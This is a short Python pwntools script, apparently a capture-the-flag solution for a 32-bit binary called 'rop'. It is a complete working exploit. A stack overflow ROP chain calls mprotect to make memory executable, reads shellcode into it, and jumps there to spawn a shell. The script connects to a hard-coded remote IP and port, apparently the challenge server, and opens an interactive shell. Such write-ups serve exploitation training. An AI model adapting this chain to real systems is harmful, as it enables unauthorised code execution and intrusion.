#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./rop"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("139.224.220.67", 30002)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()


r = remote("139.224.220.67",30002)


p3_pos = 0x08048BFb
mprotect_pos = 0x0806DD70
inject_pos = 0x8048000
run_pos = inject_pos + 0x500
read_pos = 0x806D270

payload = 'a'*0x9 + 'a'*0x4 + p32(mprotect_pos) + p32(p3_pos)

payload+= p32(inject_pos) + p32(0x1000) + p32(7)
payload+= p32(read_pos)+p32(run_pos) + p32(0)+p32(run_pos) + p32(0x80)

sh= asm(shellcraft.sh())
r.sendline(payload)
r.sendline(sh)

r.interactive()
